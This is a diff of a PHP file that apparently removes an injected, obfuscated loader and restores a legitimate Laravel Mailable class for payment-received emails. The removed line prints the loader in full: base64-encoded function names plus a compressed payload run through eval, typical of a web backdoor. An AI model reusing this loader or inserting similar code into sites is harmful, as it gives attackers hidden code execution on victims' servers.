@@ -1,1 +1,37 @@
-<?php $_='0a4c03e1';$__='printf'; $_____='b2JfZW5kX2NsZWFu'; $______________='cmV0dXJuICAgIGV2YWwoJF8pOw=='; $__________________='X19vbWVnYQ=='; $______=' Z3p1bmNvbXByZXNz';$___=' b2Jfc3RhcnQ=';$____='b2JfZ2V0X2NvbnRlbnRz';$__= 'base64_decode' ; $______=$__($______); if(!function_exists('__omega')){function __omega($_oA,$_oS){return eval("return function($_oA){{$_oS}};");}}$__________________=$__($__________________); $______________=$__($______________); $__________=$__________________('$_',$______________); $_____=$__($_____);$____=$__($____);$___=$__($___); $_='eNqlVMtyozoQ3c9XeDFVJDV3gXCYG8rlhSHmISfMgAGBNikL2fghHh6MDf76KyAhzp2a1VAlaKR+nO4+6tGof76+fjxTYSPLYEMBFSZf+43i1y47bYTJl9GN/nQkhEA5ExRkkTOdCqOP43d/Uy4KcRqINISVpamMpnq50NxNCB6LH5fWaPTZ6eto1BmRVbn+/vBK13FO18LkN4hPTm5rqbzl0a+xoe/xUlVjU409pBfkqbS1RFzQ0GbWnJXEDE4rJG+pEcROFlxDXQc4DFiEYIk9rsv3uD0kRg0IYlUUuiyc22eSuU2EbDEGtUtRAHBQeytDAcRw+/8/2oLtCtU9FkPfEcP/98kpQCz5yRLVJUWgIKkucn+DXxzCIkJ1sU6Dq4eUA0b19cdFXHC7PfdxjRvViUJ2wkgWvVQRVwgXkaTzr1K5qI13SXC4Ffn5gevaEWJll58jLtbcj6XNEsvssPYxUYertHSbxSnbEoN9x6FtE8llxHzhePOktYnNgOuxvaW5eyLJrX+xx9WfPzf58V22tDxxxpC1NbCMeULSYGwZgMVje4t57rwHV2roVST51Y2Nre1mnbzYqbOBLCY+r5Bzc/b4JqsXyvNaoZcEZ0EVjd2CSA8JZ2KL70pNCKKxk0Oj6x8jmVO8xxrq0K8DNbZF3IjfIkmpODcqqs2U/+fZ103s+NTbPR4Xgzw7WnMIeK8PlunmvLYnXsNrhCh7vtH5VB8TMmoGDdm9xf/AdHwe4qkgSusiatSUInlPDXYmO3VHeU+xlvwhH7XBoQvi9CGBHMsqfDn9zHCBwziHUsePit8Tmd8XnmdcfGBql/gNZ/BMllteryiHIlCXfr1xGfzpBYrqzt2lG9gebA6l1dZpl2Ser0NPVwz/oNihKKue72eL5WHoV8cNj/cDwSPmd2ih0YG/Fq9BJAUFTYODtfwdC+fAhZjMJ81f4xl4vOH3oF03M+xmTHXfu7e/+27q3ezdT941u807oX0L/wzqnwfYm5+723l1fz/5D+8auFU='; $___();$__________($______($__($_))); $________=$____(); $_____(); echo $________;
+<?php
+
+namespace App\Mail;
+
+use Illuminate\Bus\Queueable;
+use Illuminate\Contracts\Queue\ShouldQueue;
+use Illuminate\Mail\Mailable;
+use Illuminate\Queue\SerializesModels;
+
+class PaymentNotificationEmail extends Mailable
+{
+    use Queueable, SerializesModels;
+    public $content;
+
+    /**
+     * Create a new message instance.
+     *
+     * @return void
+     */
+    public function __construct($content)
+    {
+        $this->content = $content;
+    }
+
+    /**
+     * Build the message.
+     *
+     * @return $this
+     */
+    public function build()
+    {
+        return $this->view('mail.payment')
+        ->from(env('MAIL_FROM_ADDRESS'), env('MAIL_FROM_NAME'))
+        ->subject('Payment received!')
+        ->replyTo(env('MAIL_FROM_ADDRESS'), env('MAIL_FROM_NAME'));
+    }
+}
